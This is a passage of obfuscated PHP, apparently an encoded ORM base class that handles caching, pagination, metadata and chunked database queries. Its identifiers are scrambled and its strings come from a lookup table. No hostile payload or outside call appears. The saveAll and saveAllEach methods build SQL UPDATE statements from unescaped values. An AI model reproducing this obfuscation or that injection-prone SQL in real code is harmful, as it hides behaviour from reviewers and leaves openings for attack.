$Æ¹­¾š¤) { $İõ˜ç— = $Æ¹­¾š¤[0]; $âöÎ§­‡ = explode($_SERVER[¿ğÚ‰±–][50], $Æ¹­¾š¤[1]); if ($”ñ´åéó == $÷ÑÃÆ¯) { return $this->cacheFunctionGet($÷ÑÃÆ¯, $İõ˜ç—); } if ($¤‚ïŞ && in_array($”ñ´åéó, $âöÎ§­‡)) { $this->cacheFunctionClear($÷ÑÃÆ¯, $İõ˜ç—); } } } public function cacheFunctionGet($Ó²§©–Â, $òÏ†Â¶Â) { $½‚ÉÒ” = $this->cacheKeyMake($Ó²§©–Â, $òÏ†Â¶Â); $â©Ö±ÊÙ = Cache::get($½‚ÉÒ”); if (!is_array($â©Ö±ÊÙ)) { $â©Ö±ÊÙ = call_user_func_array(array($this, $Ó²§©–Â), array($òÏ†Â¶Â, !0)); Cache::set($½‚ÉÒ”, $â©Ö±ÊÙ); } return $â©Ö±ÊÙ; } public function cacheFunctionClear($ëâë»ŒÅ, $Ç³Óšœó) { $¾ øŒ‹ò = $Ç³Óšœó; if (!is_array($Ç³Óšœó)) { $¾ øŒ‹ò = array($Ç³Óšœó); } foreach ($¾ øŒ‹ò as $ˆ³Şš) { $¾§ßÒÊö = $this->cacheKeyMake($ëâë»ŒÅ, $ˆ³Şš); Cache::remove($¾§ßÒÊö); } } private function cacheKeyMake($·®’×ôÌ, $·ª¨É…ª) { $€Šş¾Ùİ =& $_SERVER[¿ğÚ‰±–]; return get_class($this) . $€Šş¾Ùİ[11] . $·®’×ôÌ . $€Šş¾Ùİ[437] . $·ª¨É…ª; } protected function selectPageReset() { $ü¡òä‘Õ =& $_SERVER[¿ğÚ‰±–]; if (isset($GLOBALS[$ü¡òä‘Õ[438]])) { return; } $GLOBALS[$ü¡òä‘Õ[438]] = isset($GLOBALS[$ü¡òä‘Õ[7]][$ü¡òä‘Õ[439]]) ? $GLOBALS[$ü¡òä‘Õ[7]][$ü¡òä‘Õ[439]] : !1; $GLOBALS[$ü¡òä‘Õ[440]] = isset($GLOBALS[$ü¡òä‘Õ[7]][$ü¡òä‘Õ[429]]) ? $GLOBALS[$ü¡òä‘Õ[7]][$ü¡òä‘Õ[429]] : !1; $GLOBALS[$ü¡òä‘Õ[7]][$ü¡òä‘Õ[439]] = !1; $GLOBALS[$ü¡òä‘Õ[7]][$ü¡òä‘Õ[429]] = !1; } protected function selectPageRestore() { $â‰ÕÃáÖ =& $_SERVER[¿ğÚ‰±–]; if (!isset($GLOBALS[$â‰ÕÃáÖ[438]])) { return; } $GLOBALS[$â‰ÕÃáÖ[7]][$â‰ÕÃáÖ[439]] = $GLOBALS[$â‰ÕÃáÖ[438]]; $GLOBALS[$â‰ÕÃáÖ[7]][$â‰ÕÃáÖ[429]] = $GLOBALS[$â‰ÕÃáÖ[440]]; if ($GLOBALS[$â‰ÕÃáÖ[7]][$â‰ÕÃáÖ[439]] === !1) { unset($GLOBALS[$â‰ÕÃáÖ[7]][$â‰ÕÃáÖ[439]]); } if ($GLOBALS[$â‰ÕÃáÖ[7]][$â‰ÕÃáÖ[429]] === !1) { unset($GLOBALS[$â‰ÕÃáÖ[7]][$â‰ÕÃáÖ[429]]); } unset($GLOBALS[$â‰ÕÃáÖ[438]]); unset($GLOBALS[$â‰ÕÃáÖ[440]]); } protected function selectPage($°•Êíºí = 200, $§ÇÔüÓó = 1) { $¦Ë”€Óä =& $_SERVER[¿ğÚ‰±–]; global $in; $ÓÇæÜ“º = $this->optionsValue(); $Æ¢ß‹î¼ = 50000; $°•Êíºí = isset($in[$¦Ë”€Óä[439]]) && $in[$¦Ë”€Óä[439]] ? $in[$¦Ë”€Óä[439]] : $°•Êíºí; if ($°•Êíºí === -1) { $in[$¦Ë”€Óä[439]] = !1; $Æ¢ß‹î¼ = 100000000; $°•Êíºí = $Æ¢ß‹î¼; } $¹ì’Ëƒ• = $ÓÇæÜ“º; $¹ì’Ëƒ•[$¦Ë”€Óä[441]] = array(); $°•Êíºí = intval($°•Êíºí); $°•Êíºí = $°•Êíºí <= 5 ? 5 : ($°•Êíºí >= $Æ¢ß‹î¼ ? $Æ¢ß‹î¼ : $°•Êíºí); $§ÇÔüÓó = intval(isset($in[$¦Ë”€Óä[429]]) && $in[$¦Ë”€Óä[429]] ? $in[$¦Ë”€Óä[429]] : $§ÇÔüÓó); $§ÇÔüÓó = $§ÇÔüÓó <= 1 ? 1 : $§ÇÔüÓó; $‘§È÷Ÿé = array(); $ÙûÆ‰†Ê = 1; if ($§ÇÔüÓó == 1 && $ÙûÆ‰†Ê) { $this->optionsValue($ÓÇæÜ“º); $‘§È÷Ÿé = $this->page($§ÇÔüÓó, $°•Êíºí)->select(); $óç•¶ˆ = is_array($‘§È÷Ÿé) ? count($‘§È÷Ÿé) : 0; if ($óç•¶ˆ < $°•Êíºí) { $ë ‰˜“¯ = 1; } else { $this->optionsValue($¹ì’Ëƒ•); $óç•¶ˆ = intval($this->count()); $ë ‰˜“¯ = ceil($óç•¶ˆ / $°•Êíºí); } } else { $this->optionsValue($¹ì’Ëƒ•); $óç•¶ˆ = intval($this->count()); $ë ‰˜“¯ = ceil($óç•¶ˆ / $°•Êíºí); $§ÇÔüÓó = $§ÇÔüÓó >= $ë ‰˜“¯ ? $ë ‰˜“¯ : $§ÇÔüÓó; $this->optionsValue($ÓÇæÜ“º); $‘§È÷Ÿé = $this->page($§ÇÔüÓó, $°•Êíºí)->select(); } if (!is_array($‘§È÷Ÿé)) { $‘§È÷Ÿé = array(); } if ($ë ‰˜“¯ == 1) { $óç•¶ˆ = count($‘§È÷Ÿé); } $ÖÈşµàÒ = array($¦Ë”€Óä[442] => array($¦Ë”€Óä[443] => $óç•¶ˆ, $¦Ë”€Óä[439] => $°•Êíºí, $¦Ë”€Óä[429] => $§ÇÔüÓó, $¦Ë”€Óä[444] => $ë ‰˜“¯), $¦Ë”€Óä[445] => $‘§È÷Ÿé); return $ÖÈşµàÒ; } protected function checkLength($ÙïôÅàô, $’©Ä½•ˆ = 0, $Ú­›ÌØ = '') { $”ÍÓÃó† =& $_SERVER[¿ğÚ‰±–]; $’©Ä½•ˆ = $’©Ä½•ˆ ? $’©Ä½•ˆ : 65536; if (!$ÙïôÅàô || strlen($ÙïôÅàô) < $’©Ä½•ˆ) { return; } $Ú­›ÌØ = $Ú­›ÌØ ? $Ú­›ÌØ . $”ÍÓÃó†[74] : $”ÍÓÃó†[12]; show_json($Ú­›ÌØ . LNG($”ÍÓÃó†[446]) . "\x28{$’©Ä½•ˆ}\x29", !1); } protected function metaSet($‚Ø¸³Ä, $“³Øùà¨ = null, $‚èìÅˆÌ = null) { $¹«·Ğ°¸ =& $_SERVER[¿ğÚ‰±–]; if (!$this->tableMeta || !$‚Ø¸³Ä) { return !1; } $ãû˜Œ¦Ã = $this->tableMeta[$¹«·Ğ°¸[447]]; $º¬¾âÄ = $this->tableMeta[$¹«·Ğ°¸[448]]; $İ±Øª•ğ = Model($º¬¾âÄ); $×Ì÷Ö«» = array($ãû˜Œ¦Ã => $‚Ø¸³Ä, $¹«·Ğ°¸[449] => $“³Øùà¨); if (is_null($“³Øùà¨)) { return $İ±Øª•ğ->where(array($ãû˜Œ¦Ã => $‚Ø¸³Ä))->delete(); } if (is_null($‚èìÅˆÌ) && is_string($“³Øùà¨)) { return $İ±Øª•ğ->where($×Ì÷Ö«»)->delete(); } $¨‡ó°›‘ = is_array($“³Øùà¨) ? $“³Øùà¨ : array(); if (is_string($“³Øùà¨)) { $¨‡ó°›‘[$“³Øùà¨] = $‚èìÅˆÌ; } $ªêÁŠ€å = array(); foreach ($¨‡ó°›‘ as $®Ã”ı•ä => $­ÌÙÏí…) { if (is_null($­ÌÙÏí…) && is_string($®Ã”ı•ä)) { $İ±Øª•ğ->where(array($ãû˜Œ¦Ã => $‚Ø¸³Ä, $¹«·Ğ°¸[449] => $®Ã”ı•ä))->delete(); continue; } $this->checkLength($­ÌÙÏí…, !1, $º¬¾âÄ . $¹«·Ğ°¸[4] . $®Ã”ı•ä); $ªêÁŠ€å[] = array($ãû˜Œ¦Ã => $‚Ø¸³Ä, $¹«·Ğ°¸[97] => $®Ã”ı•ä, $¹«·Ğ°¸[450] => $­ÌÙÏí…); } $Î±Ø±…¥ = $¹«·Ğ°¸[451] . $º¬¾âÄ; CacheLock::lock($Î±Ø±…¥); $İ±Øª•ğ->where(array($ãû˜Œ¦Ã => $‚Ø¸³Ä))->addAll($ªêÁŠ€å, array(), !0); CacheLock::unlock($Î±Ø±…¥); return !0; } public function metaGet($¿à›Ü¥—, $íÁœş¯´ = false) { $Å…ñ¥ãÖ =& $_SERVER[¿ğÚ‰±–]; if (!$this->tableMeta) { return array(); } $Ó©ğ÷ÎŞ = $this->tableMeta[$Å…ñ¥ãÖ[447]]; $ôïºüÙº = Model($this->tableMeta[$Å…ñ¥ãÖ[448]]); if ($íÁœş¯´) { $Íïˆ †Ğ = array($Ó©ğ÷ÎŞ => $¿à›Ü¥—, $Å…ñ¥ãÖ[97] => $íÁœş¯´); return $ôïºüÙº->where($Íïˆ †Ğ)->getField($Å…ñ¥ãÖ[450]); } $Íïˆ †Ğ = array($Ó©ğ÷ÎŞ => $¿à›Ü¥—); $Æ¤»”Ú = $ôïºüÙº->field($Å…ñ¥ãÖ[452])->where($Íïˆ †Ğ)->select(); $Æ¤»”Ú = array_to_keyvalue($Æ¤»”Ú, $Å…ñ¥ãÖ[97], $Å…ñ¥ãÖ[450]); return $Æ¤»”Ú; } private function checkDataAutoHas($Ü‚ÅØø¤) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¥ üïû) { if (in_array($Ü‚ÅØø¤, explode($_SERVER[¿ğÚ‰±–][50], $¥ üïû[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¶ÑœÁ´Ó, $í¿ãÇù) { $™…Õ¬Å˜ =& $_SERVER[¿ğÚ‰±–]; if (!is_array($¶ÑœÁ´Ó)) { return; } foreach ($this->dataAuto as $¤™¦‰ßŠ) { $û—íÁ›¢ = $¤™¦‰ßŠ[0]; if (!in_array($í¿ãÇù, explode($™…Õ¬Å˜[50], $¤™¦‰ßŠ[2]))) { continue; } switch (trim($¤™¦‰ßŠ[3])) { case $™…Õ¬Å˜[397]: case $™…Õ¬Å˜[398]: $šãÖÌÏÛ = $¤™¦‰ßŠ[1]; $è©›îª = isset($¤™¦‰ßŠ[4]) ? (array) $¤™¦‰ßŠ[4] : array(); if ($šãÖÌÏÛ == $™…Õ¬Å˜[206] && array_key_exists($û—íÁ›¢, $¶ÑœÁ´Ó)) { if (!$¶ÑœÁ´Ó[$û—íÁ›¢]) { unset($¶ÑœÁ´Ó[$û—íÁ›¢]); } break; } if (isset($¶ÑœÁ´Ó[$û—íÁ›¢])) { array_unshift($è©›îª, $¶ÑœÁ´Ó[$û—íÁ›¢]); } if ($™…Õ¬Å˜[397] == $¤™¦‰ßŠ[3]) { $¶ÑœÁ´Ó[$û—íÁ›¢] = call_user_func_array($šãÖÌÏÛ, $è©›îª); } else { $¶ÑœÁ´Ó[$û—íÁ›¢] = call_user_func_array(array(&$this, $šãÖÌÏÛ), $è©›îª); } break; case $™…Õ¬Å˜[347]: if (isset($¶ÑœÁ´Ó[$û—íÁ›¢]) && $¶ÑœÁ´Ó[$û—íÁ›¢]) { $¶ÑœÁ´Ó[$û—íÁ›¢] = call_user_func_array(array(&$this, $¤™¦‰ßŠ[1]), array($¶ÑœÁ´Ó[$û—íÁ›¢])); } break; case $™…Õ¬Å˜[350]: $¶ÑœÁ´Ó[$û—íÁ›¢] = $¶ÑœÁ´Ó[$¤™¦‰ßŠ[1]]; break; case $™…Õ¬Å˜[370]: if (isset($¶ÑœÁ´Ó[$û—íÁ›¢]) && !is_string($¶ÑœÁ´Ó[$û—íÁ›¢])) { $¶ÑœÁ´Ó[$û—íÁ›¢] = json_encode_force($¶ÑœÁ´Ó[$û—íÁ›¢]); } break; case $™…Õ¬Å˜[399]: if ($¶ÑœÁ´Ó[$û—íÁ›¢] === $™…Õ¬Å˜[12]) { unset($¶ÑœÁ´Ó[$û—íÁ›¢]); } break; case $™…Õ¬Å˜[400]: $¶ÑœÁ´Ó[$û—íÁ›¢] = $¤™¦‰ßŠ[1]; default: break; } } if ($í¿ãÇù == $™…Õ¬Å˜[431]) { $¹ª×Æ»š = strtolower($this->db->getDbType()); if (strpos($¹ª×Æ»š, $™…Õ¬Å˜[13]) !== 0) { return; } $€²ù¢‹ = $this->field(!0)->fields; $›º’ÎÕÄ = $€²ù¢‹[$™…Õ¬Å˜[329]]; if (isset($€²ù¢‹[$™…Õ¬Å˜[328]])) { unset($›º’ÎÕÄ[$€²ù¢‹[$™…Õ¬Å˜[328]]]); } foreach ($›º’ÎÕÄ as $ı°Œ£Ì¥ => $í¿ãÇù) { if (!isset($¶ÑœÁ´Ó[$ı°Œ£Ì¥])) { $¶ÑœÁ´Ó[$ı°Œ£Ì¥] = $™…Õ¬Å˜[12]; } } } } private function dataAfterFilter(&$›½§Ò«Ø) { $¨±×™‡ =& $_SERVER[¿ğÚ‰±–]; foreach ($this->dataAuto as $•—¼±ÓÅ) { $ÁŠ›£¼Ş = $•—¼±ÓÅ[0]; if (!isset($›½§Ò«Ø[$ÁŠ›£¼Ş])) { continue; } if (!in_array($¨±×™‡[433], explode($¨±×™‡[50], $•—¼±ÓÅ[2]))) { continue; } switch (trim($•—¼±ÓÅ[3])) { case $¨±×™‡[397]: case $¨±×™‡[398]: $‘À¯å”‘ = isset($•—¼±ÓÅ[4]) ? (array) $•—¼±ÓÅ[4] : array(); array_unshift($‘À¯å”‘, $›½§Ò«Ø[$ÁŠ›£¼Ş]); if (isset($•—¼±ÓÅ[4]) && $•—¼±ÓÅ[4] == $¨±×™‡[453]) { $‘À¯å”‘ = array($›½§Ò«Ø[$ÁŠ›£¼Ş]); } if ($¨±×™‡[397] == $•—¼±ÓÅ[3]) { $›½§Ò«Ø[$ÁŠ›£¼Ş] = call_user_func_array($•—¼±ÓÅ[1], $‘À¯å”‘); } else { $›½§Ò«Ø[$ÁŠ›£¼Ş] = call_user_func_array(array(&$this, $•—¼±ÓÅ[1]), $‘À¯å”‘); } break; case $¨±×™‡[347]: if (isset($›½§Ò«Ø[$ÁŠ›£¼Ş]) && $›½§Ò«Ø[$ÁŠ›£¼Ş]) { $›½§Ò«Ø[$ÁŠ›£¼Ş] = call_user_func_array(array(&$this, $•—¼±ÓÅ[1]), array($›½§Ò«Ø[$ÁŠ›£¼Ş])); } break; case $¨±×™‡[350]: $›½§Ò«Ø[$ÁŠ›£¼Ş] = $›½§Ò«Ø[$•—¼±ÓÅ[1]]; break; case $¨±×™‡[370]: $«â¾‹‚¨ = $›½§Ò«Ø[$ÁŠ›£¼Ş]; $›½§Ò«Ø[$ÁŠ›£¼Ş] = json_decode($«â¾‹‚¨, !0); if (is_null($›½§Ò«Ø[$ÁŠ›£¼Ş])) { $›½§Ò«Ø[$ÁŠ›£¼Ş] = $«â¾‹‚¨; } break; case $¨±×™‡[399]: if ($›½§Ò«Ø[$ÁŠ›£¼Ş] === $¨±×™‡[12]) { unset($›½§Ò«Ø[$ÁŠ›£¼Ş]); } break; case $¨±×™‡[400]: $›½§Ò«Ø[$ÁŠ›£¼Ş] = $•—¼±ÓÅ[1]; break; default: break; } } } public function saveAll($¿èò¬µİ) { $ë Ê‚æ =& $_SERVER[¿ğÚ‰±–]; $¿ÆÏ‰²ã = $this->tablePrefix . $this->tableName; $é†“òß‡ = self::SQL_WHERE_IN_CHUNK; $¿èò¬µİ = is_array($¿èò¬µİ) ? $¿èò¬µİ : array(); $¥‰Êó˜› = $ë Ê‚æ[454]; $»Ï™é•› = 0; $¯ÌÚ¼ÄÌ = array(); $Ìšùğà = count($¿èò¬µİ); for ($Ã½“Úãú = 0; $Ã½“Úãú < $Ìšùğà; $Ã½“Úãú++) { $â÷¥äÚâ = $¿èò¬µİ[$Ã½“Úãú]; if (!is_array($â÷¥äÚâ) || count($â÷¥äÚâ) != 4) { continue; } $´áĞñÚé = "\125\120\x44\101\124\x45\40\140{$¿ÆÏ‰²ã}\x60\x20\123\105\124\40{$â÷¥äÚâ[2]}\x20\75\x20\x43\101\x53\x45\40{$â÷¥äÚâ[0]}\x20\xa"; if ($»Ï™é•› == 0) { $¥‰Êó˜› = $´áĞñÚé; } $¯ÌÚ¼ÄÌ[] = $ë Ê‚æ[121] . $â÷¥äÚâ[1] . $ë Ê‚æ[121]; $»Ï™é•›++; $¥‰Êó˜› .= "\40\x57\x48\105\x4e\40\47{$â÷¥äÚâ[1]}\x27\x20\124\110\x45\116\x20\x27{$â÷¥äÚâ[3]}\x27\40\xa"; if ($»Ï™é•› == $é†“òß‡ || $Ã½“Úãú == $Ìšùğà - 1) { $¸¼¢Ø‰å = implode($ë Ê‚æ[50], $¯ÌÚ¼ÄÌ); $¥‰Êó˜› .= "\40\105\116\104\40\x20\127\110\x45\122\105\40{$â÷¥äÚâ[0]}\x20\x49\x4e\x20\x28{$¸¼¢Ø‰å}\51\40"; $this->execute($¥‰Êó˜›); $»Ï™é•› = 0; $¥‰Êó˜› = $´áĞñÚé; $this->chunkEventCheck(count($¯ÌÚ¼ÄÌ)); $¯ÌÚ¼ÄÌ = array(); } } $this->chunkEventSet(); } public function saveAllEach($•€¡ƒ†) { $ü‡ÕÓí¢ =& $_SERVER[¿ğÚ‰±–]; $Ù¡õ™ËÜ = $this->tablePrefix . $this->tableName; foreach ($•€¡ƒ† as $òŞäıµğ) { if (!is_array($òŞäıµğ) || count($òŞäıµğ) != 4) { continue; } $²›«ŸÑÊ = $òŞäıµğ[0] . $ü‡ÕÓí¢[455] . $òŞäıµğ[1] . $ü‡ÕÓí¢[121]; $àÊæ©õ¾ = $òŞäıµğ[2] . $ü‡ÕÓí¢[455] . $òŞäıµğ[3] . $ü‡ÕÓí¢[121]; $¬û÷×® = "\165\160\x64\141\x74\145\40{$Ù¡õ™ËÜ}\x20\163\x65\x74\x20{$àÊæ©õ¾}\x20\x77\150\x65\x72\x65\40{$²›«ŸÑÊ}\73"; $this->execute($¬û÷×®); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ÑâñàÚ“ = false, $ÖÁé“áÎ = false) { $this->_chunkEvent = $ÑâñàÚ“; $this->_chunkEventParam = $ÖÁé“áÎ; } private function chunkEventCheck($İìÜûÌë) { if (!$this->_chunkEvent) { return; } $º‘ûÌ¡ò = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $º‘ûÌ¡ò[$_SERVER[¿ğÚ‰±–][456]] = $İìÜûÌë; Hook::trigger($this->_chunkEvent, $º‘ûÌ¡ò); } public function addAll($°ğï˜²µ, $ÜëšÔˆ = array(), $Ø×Â÷”± = false) { $ò°Ç’˜Ô =& $_SERVER[¿ğÚ‰±–]; ignore_timeout(); $¶È€ÀÑâ = self::SQL_WHERE_IN_CHUNK; if (empty($°ğï˜²µ)) { $this->error = think_lang($ò°Ç’˜Ô[348]); return !1; } $ÜëšÔˆ = $this->_parseOptions($ÜëšÔˆ); foreach ($°ğï˜²µ as $§äêÌòå => $±Üû·æ–) { $°ğï˜²µ[$§äêÌòå] = $this->_facade($±Üû·æ–); $this->_beforeInsert($°ğï˜²µ[$§äêÌòå], $ÜëšÔˆ); } if (method_exists($this->db, $ò°Ç’˜Ô[349])) { for ($şæÀ£°ñ = 0; $şæÀ£°ñ < count($°ğï˜²µ); $şæÀ£°ñ += $¶È€ÀÑâ) { $Ÿ¢Éô£ó = array_slice($°ğï˜²µ, $şæÀ£°ñ, $¶È€ÀÑâ); if (!is_array($Ÿ¢Éô£ó) || count($Ÿ¢Éô£ó) == 0) { break; } $âéÙŒ¹ş = $this->db->insertAll($Ÿ¢Éô£ó, $ÜëšÔˆ, $Ø×Â÷”±); $this->chunkEventCheck(count($Ÿ¢Éô£ó)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($°ğï˜²µ as $§äêÌòå => $±Üû·æ–) { $âéÙŒ¹ş = $this->db->insert($±Üû·æ–, $ÜëšÔˆ, $Ø×Â÷”±); } $this->commit(); } if (!1 !== $âéÙŒ¹ş) { $™Æ—ñ‚ = $this->getLastInsID(); if ($™Æ—ñ‚) { return $™Æ—ñ‚; } } return $âéÙŒ¹ş; } public function save($àüæÏÄÌ = '', $­´–øƒ = array()) { $’öÇèÉÁ =& $_SERVER[¿ğÚ‰±–]; $Òñˆ¡ğƒ = self::SQL_WHERE_IN_CHUNK; $œ‡¬Ã  = $this->optionsValue(); $û‰¨íìà = $this->findWhereField($œ‡¬Ã ); if (!$û‰¨íìà) { return parent::save($àüæÏÄÌ, $­´–øƒ); } $™ü¿âß = 0; $²›¡¢£º = $œ‡¬Ã [$’öÇèÉÁ[352]][$û‰¨íìà][1]; $²›¡¢£º = is_array($²›¡¢£º) ? $²›¡¢£º : array(); $¼ÆËı€¯ = count($²›¡¢£º); for ($¼¢üŸÍ = 0; $¼¢üŸÍ < $¼ÆËı€¯; $¼¢üŸÍ += $Òñˆ¡ğƒ) { $ˆÕ³›Ô = array_slice($²›¡¢£º, $¼¢üŸÍ, $Òñˆ¡ğƒ); if (!is_array($ˆÕ³›Ô) || count($ˆÕ³›Ô) == 0) { break; } $œ‡¬Ã [$’öÇèÉÁ[352]][$û‰¨íìà][1] = $ˆÕ³›Ô; $this->optionsValue($œ‡¬Ã ); $™ü¿âß += parent::save($àüæÏÄÌ, $­´–øƒ); $this->chunkEventCheck(count($ˆÕ³›Ô)); } $this->chunkEventSet(); return $™ü¿âß; } public function add($Ôß£Ôé¬ = '', $‘‡í ê = array(), $©´Éıœ = false) { if ($this->addTaskStatus && is_array($Ôß£Ôé¬)) { $this->addTaskData[] = $Ôß£Ôé¬; return; } return parent::add($Ôß£Ôé¬, $‘‡í ê, $©´Éıœ); } public function parseWhereLike($õ‡œË¶Ñ, $áĞû”æâ = '', $İƒó÷ô³ = false, &$ò‰Àˆ¸õ = false) { $ÚÂ²¿Ñ =& $_SERVER[¿ğÚ‰±–]; $Ë¨§ãş† = $GLOBALS[$ÚÂ²¿Ñ[6]][$ÚÂ²¿Ñ[457]]; if (!$Ë¨§ãş†[$ÚÂ²¿Ñ[458]]) { return $õ‡œË¶Ñ; } if (!is_array($õ‡œË¶Ñ)) { return $õ‡œË¶Ñ; } $§Ù…¾œ÷ = array(); $ˆêÎ…Áğ = 0; foreach ($õ‡œË¶Ñ as $çĞËãÑ¸ => $ƒå˜™í²) { if (is_array($ƒå˜™í²) && count($ƒå˜™í²) == 2 && $ƒå˜™í²[0] == $ÚÂ²¿Ñ[459] && is_string($ƒå˜™í²[1]) && substr($ƒå˜™í²[1], 0, 1) == $ÚÂ²¿Ñ[460] && substr($ƒå˜™í²[1], strlen($ƒå˜™í²[1]) - 1, 1) == $ÚÂ²¿Ñ[460]) { $ò‰Àˆ¸õ = !0; $øŞé = is_string($çĞËãÑ¸) ? $çĞËãÑ¸ : $áĞû”æâ; $À´¡ï = substr($ƒå˜™í²[1], 1, strlen($ƒå˜™í²[1]) - 2); $À´¡ï = $this->db->escapeString($À´¡ï); if (!strpos($øŞé, $ÚÂ²¿Ñ[10])) { $øŞé = $ÚÂ²¿Ñ[461] . $øŞé . $ÚÂ²¿Ñ[461]; } $ãåêâò’ = $ÚÂ²¿Ñ[220] . $À´¡ï . $ÚÂ²¿Ñ[220]; $À´¡ï = str_replace(array($ÚÂ²¿Ñ[10], $ÚÂ²¿Ñ[462], $ÚÂ²¿Ñ[11]), $ÚÂ²¿Ñ[463], $À´¡ï); if ($Ë¨§ãş†[$ÚÂ²¿Ñ[464]]) { $ãåêâò’ = $ÚÂ²¿Ñ[465] . $À´¡ï . $ÚÂ²¿Ñ[466]; if ($Ë¨§ãş†[$ÚÂ²¿Ñ[467]]) { $ãåêâò’ = $ÚÂ²¿Ñ[466] . $À´¡ï . $ÚÂ²¿Ñ[465]; } } $§Ù…¾œ÷[$ˆêÎ…Áğ] = $ÚÂ²¿Ñ[468] . $øŞé . $ÚÂ²¿Ñ[469] . $ãåêâò’ . $ÚÂ²¿Ñ[470]; $ˆêÎ…Áğ++; continue; } if (is_array($ƒå˜™í²)) { $áĞû”æâ = is_string($çĞËãÑ¸) ? $çĞËãÑ¸ : $áĞû”æâ; $ƒå˜™í² = $this->parseWhereLike($ƒå˜™í², $áĞû”æâ, !0, $ò‰Àˆ¸õ); } if (is_numeric($çĞËãÑ¸)) { $§Ù…¾œ÷[$ˆêÎ…Áğ] = $ƒå˜™í²; $ˆêÎ…Áğ++; } else { $§Ù…¾œ÷[$çĞËãÑ¸] = $ƒå˜™í²; } } if ($ò‰Àˆ¸õ && !$İƒó÷ô³) { } return $§Ù…¾œ÷; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($‡áù´ = array()) { $å”´À“ª =& $_SERVER[¿ğÚ‰±–]; $¶ê¨Úæë = self::SQL_WHERE_IN_CHUNK; $ÁµÓá¤€ = $this->optionsValue(); $Æ³—»¢º = $this->findWhereField($ÁµÓá¤€); if (!$Æ³—»¢º || isset($ÁµÓá¤€[$å”´À“ª[368]]) || isset($ÁµÓá¤€[$å”´À“ª[429]])) { return parent::select($‡áù´); } $”Ì¸ú–“ = $ÁµÓá¤€[$å”´À“ª[352]][$Æ³—»¢º][1]; $”Ì¸ú–“ = is_array($”Ì¸ú–“) ? $”Ì¸ú–“ : array(); $‘·îˆâ = null; for ($ê¾ÁÎ×˜ = 0; $ê¾ÁÎ×˜ < count($”Ì¸ú–“); $ê¾ÁÎ×˜ += $¶ê¨Úæë) { $©ÛÇòè = array_slice($”Ì¸ú–“, $ê¾ÁÎ×˜, $¶ê¨Úæë); if (!is_array($©ÛÇòè) || count($©ÛÇòè) == 0) { break; } $ÁµÓá¤€[$å”´À“ª[352]][$Æ³—»¢º][1] = $©ÛÇòè; $this->optionsValue($ÁµÓá¤€); $ûä¢Ÿ¶ = parent::select($‡áù´); if (!$ûä¢Ÿ¶) { continue; } $‘·îˆâ = is_array($‘·îˆâ) ? $‘·îˆâ : array(); $‘·îˆâ = array_merge($‘·îˆâ, $ûä¢Ÿ¶); } return $‘·îˆâ; } public function delete($ÂĞááòâ = array()) { $è„ø‹ì =& $_SERVER[¿ğÚ‰±–]; $Ôóì¹îŞ = self::SQL_WHERE_IN_CHUNK; $õšêÌœß = $this->optionsValue(); $ÎŒµß½Ü = $this->findWhereField($õšêÌœß); if (!$ÎŒµß½Ü) { return parent::delete($ÂĞááòâ); } $ù®°á–· = 0; $ù®‘×ÁÕ = $õšêÌœß[$è„ø‹ì[352]][$ÎŒµß½Ü][1]; $ù®‘×ÁÕ = is_array($ù®‘×ÁÕ) ? $ù®‘×ÁÕ : array(); for ($×›úæš¯ = 0; $×›úæš¯ < count($ù®‘×ÁÕ); $×›úæš¯ += $Ôóì¹îŞ) { $Õ‰“ƒéº = array_slice($ù®‘×ÁÕ, $×›úæš¯, $Ôóì¹îŞ); if (!is_array($Õ‰“ƒéº) || count($Õ‰“ƒéº) == 0) { break; } $õšêÌœß[$è„ø‹ì[352]][$ÎŒµß½Ü][1] = $Õ‰“ƒéº; $this->optionsValue($õšêÌœß); $ù®°á–· += parent::delete($ÂĞááòâ); } return $ù®°á–·; } private function findWhereField($ÄûÇãÙÊ) { $å‰ËõÙĞ =& $_SERVER[¿ğÚ‰±–]; $î®İçñ“ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÄûÇãÙÊ) || !is_array($ÄûÇãÙÊ[$å‰ËõÙĞ[352]])) { return !1; } foreach ($ÄûÇãÙÊ[$å‰ËõÙĞ[352]] as $æĞ”­‘¿ => $Á‹›ûâ¡) { if (is_array($Á‹›ûâ¡) && isset($Á‹›ûâ¡[0]) && is_string($Á‹›ûâ¡[0]) && strtolower($Á‹›ûâ¡[0]) == $å‰ËõÙĞ[7] && is_array($Á‹›ûâ¡[1]) && count($Á‹›ûâ¡[1]) > $î®İçñ“) { ignore_timeout(); return $æĞ”­‘¿; } } return !1; } public function setMasterDB($šğôµ‹è = true) { think_config($_SERVER[¿ğÚ‰±–][471], $šğôµ‹è); } } goto B‡ä™ï; dóï‘„õ†: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\114\x69\x67\x68\164\101\x70\x70"; public $modelType = "\123\171\x73\x74\145\x6d\117\x70\164\151\x6f\156"; public $field = array("\x6e\141\155\145", "\147\162\157\x75\x70", "\144\145\x73\x63", "\x63\157\x6e\164\x65\156\x74"); public function listData($Í±¼¼•Ó = false, $«Ôâ¶± = "\x6d\157\x64\151\146\x79\124\x69\x6d\145", $ÈÈ…Èè = true) { return parent::listData($Í±¼¼•Ó, $«Ôâ¶±, $ÈÈ…Èè); } public function remove($åˆ¥¤­ù) { $Ï»èìÒ = $this->findByName($åˆ¥¤­ù); if (!$Ï»èìÒ) { return !1; } return parent::remove($Ï»èìÒ[$_SERVER[¿ğÚ‰±–][475]]); } public function add($ßĞÚÂ¼Š) { if ($this->findByName($ßĞÚÂ¼Š[$_SERVER[¿ğÚ‰±–][32]])) { return !1; } return parent::insert($ßĞÚÂ¼Š); } public function update($¯ñÕ¢›ö, $Äå®¥ıÙ) { $ÕØó•¢Ô =& $_SERVER[¿ğÚ‰±–]; $§™­Æ³ = $this->findByName($¯ñÕ¢›ö); $ïõÃ = $this->findByName($Äå®¥ıÙ[$ÕØó•¢Ô[32]]); if (!$§™­Æ³ || $ïõÃ && $ïõÃ[$ÕØó•¢Ô[475]] != 